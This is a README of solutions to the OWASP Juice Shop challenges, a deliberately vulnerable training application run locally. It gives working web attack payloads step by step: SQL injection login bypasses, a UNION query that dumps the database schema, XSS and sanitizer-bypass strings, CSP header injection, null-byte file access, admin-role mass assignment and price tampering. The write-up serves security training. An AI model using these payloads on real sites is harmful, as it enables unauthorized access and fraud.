# OWASP-juice-shop-solutions
This repo holds my solutions for the OWASP Juice Shop challenges
## Prerequisite Challenges
### 1. Confidential Document
Navigate to the "About Us" page. There is a link in the middle of the paragraph that is highlighted green. Click that link and you will be redirected to `localhost:3000/ftp/legal.md`. We want to access the content in this file's parent directory. This can be easily accomplished by changing the URL to `localhost:3000/ftp`. Open the `acquisitions.md` file to complete the challenge.
### 2. Exposed Metrics
The linked documentation for prometheus mentions a directory called `/metrics` as the standard endpoint. Simply naviagte to `localhost:3000/metrics` to reveal metric information and complete the challenge.
### 3. Missing Encoding
Inspect the broken image. Find the src link: 
```
http://localhost:3000/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg
```
Visit this link in your browser. Then, check the Network tab. It will show that the actual visited link reads: 
```
http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-
``` 
which is everything up until the first `#` symbol. The website can render unencoded pound signs, but your browser cannot. Encode each `#` as `%23` to get the solution URL: 
```
http://localhost:3000/assets/public/images/uploads/😼-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg
```
### 4. Web3 Sandbox
Search for `sandbox` in main.js to reveal the path:
```
localhost:3000/#/web3-sandbox
```
Navigating to this URL solves the challenge.
### 5. Login Admin
For this challenge, a SQL injection attack must be used to login without the right credentials. A common approach for these problems is to enter quotes `'` to manipulate the sql query string. Enter `'` as the username and any value as the password and then click login. Inspect the Network tab to see how the client interpreted this login. You should see a line in the response like this:
```
"sql": "SELECT * FROM Users WHERE email = ''' AND password = '098f6bc*****************' AND deletedAt IS NULL"
```
This produces a sqlite compile error because there is an unexpected quote within the query. In order to login, we need the query to return at least one record. This can be accomplished by adding a clause that always evaluates to true, like: `email = '' OR TRUE`. This is close to the final solution but there is still an error with the quote formatting:
```
"sql": "SELECT * FROM Users WHERE email = '' OR TRUE' AND password = '098f6bc*****************' AND deletedAt IS NULL"
```

 this is resolved by commenting out the rest of the internal code by inputting an email as:
```
' OR TRUE--
```
Now the full query reads as:
```
"sql": "SELECT * FROM Users WHERE email = '' OR TRUE--' AND password = '098f6bc*****************' AND deletedAt IS NULL"
```
which is effectively:
```
"sql": "SELECT * FROM Users WHERE email = '' OR TRUE"
```
Since this query always returns TRUE, the database will return every record. Since the application expects only one user to be returned, it will automatically take the first record from the result set. In this case it will be the admin login. The first user is often the admin because user IDs are usually incremented from 1 and admin accounts are often created first in a database.
### 6. Admin Section
Navigate to this URL:
```
http://localhost:3000/#/administration
```
### 7. Password Strength
email: `admin@juice-sh.op`
password: `admin123`

### 8. View Basket
Change the `bid` to 1 in developer tools -> Session settings. Navigate away from basket and then back to basket.
### 9. Empty User Registration
To solve this challenge you have to modify the client-side javascript. Inspect the "Register" button on the registration page. Find this element in the code:
```
<button _ngcontent-jwc-c32="" type="submit" id="registerButton" mat-raised-button="" color="primary" aria-label="Button to complete the registration" class="mat-focus-indicator mat-raised-button mat-button-base mat-primary mat-button-disabled" disabled="true"><span class="mat-button-wrapper"><i _ngcontent-jwc-c32="" class="material-icons"> person_add </i> Register </span><span matripple="" class="mat-ripple mat-button-ripple"></span><span class="mat-button-focus-overlay"></span></button>
```
Delete the portion that says `disabled="true"` then click "Register" on the UI.
### 10. Five-Star Feedback
This solution requires that you have completed number 6. Login Admin and number 7. Admin Section. Login as the admin and navigate to the admin section (`http://localhost:3000/#/administration`). Click the trash can icon next to the one five-star review.
## XSS Attacks
### 1. API Only XSS
To find potential vulnerabilities for an API XSS attack, you can search `main.js` for vulnerable functions like `bypassSecurityTrustHtml`. There are a few places in the code where this function is found. One of those places is in the Product Description:
```
trustProductDescription(e) {
 for (let o = 0; o < e.length; o++)
 e[o].description = this.sanitizer.bypassSecurityTrustHtml(e[o].description)
}
```
This tells us that we should try to replace a product description with the XSS attack payload. Then, when a user opens the product information on the UI, they will get an XSS notification.
 Determining the exact format of the payload takes some tinkering around with postman and the API. Ultimately, you will need to identify the link for a specific product, for example, the link to the Banana Juice is:
```
http://localhost:3000/api/Products/6
```
Use a `PUT` request to update the description in the format: 
```
{"description":"<iframe src=\"javascript:alert(`xss`)\">"}
```
Note that the inner quotes are escaped. After sending the request, refresh the website and the challenge will be solved. Click on the Banana Juice product to see the attack in action.
### 2. Client-side XSS Protection
Similar to the last challenge, this attack involves finding vulnerabilities for an API XSS attack. In the last problem, we found that the API uses `bypassSecurityTrustHtml` for the product description. Upon further investigation, this function is also seen for handling users emails:
```
findAllUsers() {
   this.userService.find().subscribe(e => {
       this.userDataSource = e,
       this.userDataSourceHidden = e;
       for (const o of this.userDataSource)
           o.email = this.sanitizer.bypassSecurityTrustHtml(`<span class="${this.doesUserHaveAnActiveSession(o) ? "confirmation" : "error"}">${o.email}</span>`);
       this.userDataSource = new d.by(this.userDataSource),
       this.userDataSource.paginator = this.paginatorUsers,
       this.resultsLengthUser = e.length
   }
   , e => {
       this.error = e,
       console.log(this.error)
   }
   )
}
```
Create a new account with the malicious payload as the user's email. The application sanitizes emails in the client-side but not in the backend. Therefore, the client-side XSS protection can by by-passed by submitting a POST request to http://localhost:3000/api/Users of the form:
```
{"email": "<iframe src=\"javascript:alert(`xss`)\">", "password":""}
```
Note that the inside quotes are escaped.
### 3. CSP Bypass
This challenge can be split into two main parts: loading the malicious payload into the DOM (Document Object Model) and then bypassing the CSP to allow the payload to be executed. Login as any user and navigate to the user profile page. Try loading the malicious payload into the username field. Observe that the `<script>` command is removed, followed by one letter, leaving only `lert(`xss`)</script>`. This tells us that the sanitizer can identify and remove exact html tags. However, a cleverly crafted entry can bypass this naive policy. There are a few ways to do this, here are two of them:
```
`<<script>ascript>alert(`xss`)</script>
<<a|ascript>alert(`xss`)</script>
```
In each case, the sanitizer removes what it _thinks_ to be the html tag, followed by the next character after it. In the first example that would be `<script>a` and in the second example it is `<a|a`. 
Next, we need to bypass the CSP (change it to allow inline Javascript) so the payload can be executed. Open the Network tab of the developer settings. Set your profile picture using a valid image URL and then inspect the network activity. You should see in the `profile` header that the image url is reflected as part of the CSP:
```
content-security-policy:
img-src 'self' /assets/public/images/uploads/22.jpg; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
```
Now, try putting an invalid url into the profile picture url field -- the url must still be of an image file type, like `https://does-not-exist.jpg`. Notice that this link is still reflected in the CSP, even though it cannot set the profile picture. Therefore, we can set the url to be any image url, even one that doesn't exist. Set it to be:
```
https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
```
Now, the whole CSP header should read:
```
content-security-policy:
img-src 'self' https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com
```
The browser will only interpret the first rule (up until the `;`)
```
content-security-policy:
img-src 'self' https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com;
```
The original policy rules have been overwritten by the malicious ones. Specifically, the addition of `'unsafe-inline'` tells the browser to run any inline code that exists in the DOM. Reload the page to complete the challenge.
### 4. HTTP-Header XSS
The vulnerable page is the Last Login page. We will load the malicious payload into the Last Login IP field. First, ensure that you are logged in, then logout. Search for the `/rest/saveLoginIp` url in the network traffic. This is how the application saves the last login IP address for the next time that you login. Unfortunately, the IP address header isn't shown in the request. Figuring it out is arbitrary. Add this header to the request and then resend it:
```
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```
Login again to complete the challenge.
### 5. Server-Side XSS Protection
Post a comment that bypasses a vulnerability in the library [sanitize-html version 1.4.2](https://security.snyk.io/package/npm/sanitize-html/1.4.2) (as found in package.json.bak). In particular, this version does not recursively cleanse the input. Therefore, some clever nesting of tags can bypass the library:
```
<<love this juice>iframe src="javascript:alert(`xss`)">
```
## Improper Input Validation
### 1. Admin Registration
Register as a new user and then inspect the Network traffic for `/api/Users/`. Repeat the POST request again but this time change the email slightly and add a "role" header with the value "admin":
```
{"email":"gen-admin2@juice-sh.op",
"role":"admin","password":"admin123","passwordRepeat":"admin123","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-02-27T06:51:33.047Z","updatedAt":"2025-02-27T06:51:33.047Z"},"securityAnswer":"admin"}
```
### 2. Deluxe Fraud
The official guide's solution is [here](https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html#_obtain_a_deluxe_membership_without_paying_for_it).
### 3. Mint the Honey Pot
### 4. Payback Time
When you change the quantity of an item in your cart, the network sends a PUT request. You can't buy negative quantities through the UI, but you can do so through direct api access. Change the quantity of any item in your cart. Open the corresponding put request. Copy and resend the request with a negative `quantity` header:
```
{"quantity":-4}
```
Complete the order by checking out. As ong as your total is negative, you will complete the challenge.
### 5. Upload Size
Files are uploaded from the Complaint page. First, inspect how files are uploaded properly by submitting a file less than 100kb. I used [this random file generator from pinetools](https://pinetools.com/random-file-generator). Inspect the Network traffic. You should see a POST to `/file-upload` that contains the file contents. Generate a new file that is between 100bk-200kb. Simply replace the old file content in the POST request with the new file content. You might change the filename as well. Sending this rewuest will comlete the challenge:
```
------WebKitFormBoundaryR8YFWOnjdRb8W9EA
Content-Disposition: form-data; name="file"; filename="110kb.pdf"
Content-Type: application/pdf

h{À¡&gZÒYÎC¸RvÜ:&ÂdÜ"Ês"Iâ ÆÍæb?
Û¸OLÜºüDÜ¿6xNc3*5OdlÑòµ®%Ñ·=[%¯Z!Ó©wÏo/1"Ä®¬eV7cGâñAúÙ
§Ûd¯ÃTaëû%¬xQ"fØUµ!À0?!rÝ~æåÚÅCÀæÏ÷fÇÍP+ö{Ü}SAøf ;AXÎ!
"¿cãmcHdÊ5:ªï±*SÜ¢xÜ p#©mâë!@AËø¨ò¬^;ÇÔÀ:¬{vf%*Ç!SÜ
r¿<Mâ«p¢]iÖ0"`ÀTº9Sâ1Vï|MãHÏ·ÆÿÍflsÇ,éEÚ]ÊRã[ÉC2eÙe
&Ûà¿c/»RîÓ8üÕMØDKUÛOjKäÓeL} ß¡aí»ÝºVoÔF)Ä=oPJe=<fiD7q
àÖ"+VÉÀè ûBcfl¢¢9·èy'x
d¸Ø ØÝflJÄì©!ÜahÂwWwAÁÊó |...
```
### 6. Upload Type
Copy the file upload POST request from the previous problem. Remove the file extension from the `filename`. Change the `Content-Type` to something different from .pdf or .zip (I used .png). Your request should look similar to this:
```
------WebKitFormBoundaryR8YFWOnjdRb8W9EA
Content-Disposition: form-data; name="file"; filename="50kb"
Content-Type: application/png

ÎÚk 0'wÚ&9>JoX »1gø§áflÿÌ::è©|
jã^ô)èùp5>ì+ÚÔ3vhk£Æf+oLIóö(eÀQ%úÓár58µvSèøëÁçáI`ö&})E!)m0Ç
À'õ¯GG)oSHª ç¥Ä~0
Å¥¢,økS£<Zr>¿»aNUËÊ }l¸§5ÇÆ{HEj+Úâ0m¨WÝlÔbÆ
dèT«Â®ò!/ñÛ[:
dãEYhæ7fpdÜXüîº©.2:¡ íÒö®d!pe¬0Nõ¶vTÉíváCe0ÜE'
%ê.íÑù¨6!6»HJçûÀÏkm"1ÊHäPåiMöUÕ
&A:{ÍÙ¸ÖIo0 'k4"dø©|RD&¿ÑNÍàÉA6Ã¨ÏÏáôúâmØÂ2ÂóûÊØI+6®ÛÄS +{
Í?!Û"¡ñ:V/zx} Ã¨º«&`ÚaÛª(Á\OÄNÇ%Ëé*¢Q9G/k
SZ7FèÚ Éæ
ÀÛÚIÄ¬"ÊSVÀÇò...
```
### 7. Expired Coupon
Start by looking for keywords in the source code like `coupon` and `campaign`. In main.js you will find a section of past campaigns with their respective coupon codes and the date that they were valid on:
```
this.campaigns = {
    WMNSDY2019: {
        validOn: 15519996e5,
        discount: 75
    },
    WMNSDY2020: {
        validOn: 1583622e6,
        discount: 60
    },
    WMNSDY2021: {
        validOn: 1615158e6,
        discount: 60
    },
    WMNSDY2022: {
        validOn: 1646694e6,
        discount: 60
    },
    WMNSDY2023: {
        validOn: 167823e7,
        discount: 60
    },
    ORANGE2020: {
        validOn: 15885468e5,
        discount: 50
    },
    ORANGE2021: {
        validOn: 16200828e5,
        discount: 40
    },
    ORANGE2022: {
        validOn: 16516188e5,
        discount: 40
    },
    ORANGE2023: {
        validOn: 16831548e5,
        discount: 40
    }
}
```
The `validOn` variable is a date that has been transformed in some way. Find the code which handles the coupon validiation:
```
applyCoupon() {
      this.campaignCoupon = this.couponControl.value,
      this.clientDate = new Date;
      const e = 60 * (this.clientDate.getTimezoneOffset() + 60) * 1e3;
      this.clientDate.setHours(0, 0, 0, 0),
      this.clientDate = this.clientDate.getTime() - e,
      sessionStorage.setItem("couponDetails", `${this.campaignCoupon}-${this.clientDate}`);
      const o = this.campaigns[this.couponControl.value];
      o ? this.clientDate === o.validOn ? this.showConfirmation(o.discount) : (this.couponConfirmation = void 0,
      this.translate.get("INVALID_COUPON").subscribe(a => {
          this.couponError = {
              error: a
          }
      } ...
```
The first five coupons are clearly for Women's Day -- March 8th -- but you could also do some reverse engineering to figure that out. The validation code takes the client date which comes from your computer. Change your computer's date to March 8, 2019 and then redeem the coupon code `WMNSDY2019`. It should be valid and a 75% discount on your basket total will be reflected. Complete the checkout process to solve the challenge.
It's important to note that this attack is possible only because the client is being hosted locally. If this were hosted on a private server, like all websites on the internet, then the client would get the date from the server. 
### 8. Poison Null Byte
This problem was pretty tricky, especially considering that the official solution is incorrect for more recent versions of the project. Start off by researching the poison null byte technique. It should become apparent that we will be working with the `/ftp` directory from the Confidential Document challenge. Navigate to this directory and try to open different files. If you try to open files not of type `.md` or `.pdf` then the browser will raise a file type Error (For some reason, `incident-support.kdbx` does not follow this rule). To access these restricted files, change the URL accordingly:
```
http://localhost:3000/ftp/eastere.gg%2500.md
http://localhost:3000/ftp/coupons_2013.md.bak%2500.md
```
## Injection
### 1. Login Jim / Login Bender
Both problems have same solution with different emails. Locate Jim's email in one of the product's reviews. Navigate to the login screen. To bypass the password, which we don't have, comment out the rest of the internal query after the email:
```
jim@juice-sh.op'--
```
Note that you must also end the email string with a single quote ```'```.
The same approach works for Bender with the email bender@juice-sh.op. The associated code fix challenge reveals why this attack works. The login query takes direct user input instead of binding to pre-defined variables:
```
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
```
which then becomes:
```
    models.sequelize.query(`SELECT * FROM Users WHERE email = '${jim@juice-sh.op'-- || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
```
### 2. Database Schema
For this challenge, the hacker must utilize injection to pass some query that returns the schema definition. First, identify that the application uses a SQLite database. This is documented in the [architecture overview](https://pwning.owasp-juice.shop/companion-guide/latest/introduction/architecture.html). Look up the query to get the schema definition for a SQLite database (I used Chat-GPT) and it should be something like this:
```
SELECT sql FROM sqlite_master;
```
Now, we have an idea of what the malicious payload will need to look like. Next, identify a place to inject sql queries. The obvious choice is the search bar because it pulls matching product records from the SQLite database. Messing around with the search bar UI doesn't provide any information about an injection attack being possible, let alone how the underlying query is structured. Instead, inspect the network traffic to find the corresponding GET request:
```
GET /rest/products/search?q= HTTP/1.1
```
repeat the request with different values after `q=` to find a vulnerability. Specifically, this request should trigger a SQLite error response:
```
GET /rest/products/search?q='; HTTP/1.1

 "error": {
    "message": "SQLITE_ERROR: near \";\": syntax error",
    "stack": "Error: SQLITE_ERROR: near \";\": syntax error",
    "errno": 1,
    "code": "SQLITE_ERROR",
    "sql": "SELECT * FROM Products WHERE ((name LIKE '%';%' OR description LIKE '%';%') AND deletedAt IS NULL) ORDER BY name"
  }
```
Now the underlying query has been exposed and we can easily craft a malicious union query:
```
SELECT * FROM Products WHERE ((name LIKE '%')) UNION SELECT sql FROM sqlite_master;--%' OR description LIKE '%<input>%') AND deletedAt IS NULL) ORDER BY name"
```
Therefore, `q=')) UNION SELECT sql FROM sqlite_master;--`
Make sure to URL encode q before sending it as a request:
```
q='))%20UNION%20SELECT%20sql%20FROM%20sqlite_master;--
```
You should get this error in the response:
```
 "error": {
    "message": "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns",
    "stack": "Error: SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns",
    "errno": 1,
    "code": "SQLITE_ERROR",
    "sql": "SELECT * FROM Products WHERE ((name LIKE '%')) UNION SELECT sql FROM sqlite_master;--%' OR description LIKE '%')) UNION SELECT sql FROM sqlite_master;--%') AND deletedAt IS NULL) ORDER BY name"
  }
```
In order for a union query to compile, both result tables must have the same number of columns with the same datatypes. Try adding dummy columns until this query compiles:
`q=')) UNION SELECT sql, 1, 2, 3, 4, 5, 6, 7, 8 FROM sqlite_master;--` --> URL Encode --> `q='))%20UNION%20SELECT%20sql,%201,%202,%203,%204,%205,%206,%207,%208%20FROM%20sqlite_master;--`
### 3. Christmas Special
The response from the previous problem should have returned all the products from the database, including the 2014 Christmas special. Look for this entry in the JSON:
```
{
 "id":10,
 "name":"Christmas Super-Surprise-Box (2014 Edition)",
 "description":"Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)",
 "price":29.99,"deluxePrice":29.99,
 "image":"undefined.jpg",
 "createdAt":"2025-03-13 00:19:28.789 +00:00",
 "updatedAt":"2025-03-13 00:19:28.789 +00:00",
 "deletedAt":"2025-03-13 00:19:28.812 +00:00"
},
```
Note that the `id` is `10`. Next, add any product to the basket using the UI. Inspect the network traffic to find the corresponding POST request, the body will look similar to this:
```
{
 "ProductId":1,
 "BasketId":"6",
 "quantity":1
}
```
Replace the `ProductId` with that of the Christmas Special and then repeat the request:
```
{
 "ProductId":10,
 "BasketId":"6",
 "quantity":1
}
```
Refresh the page to see the item in your basket. Complete the checkout process to solve the challenge.
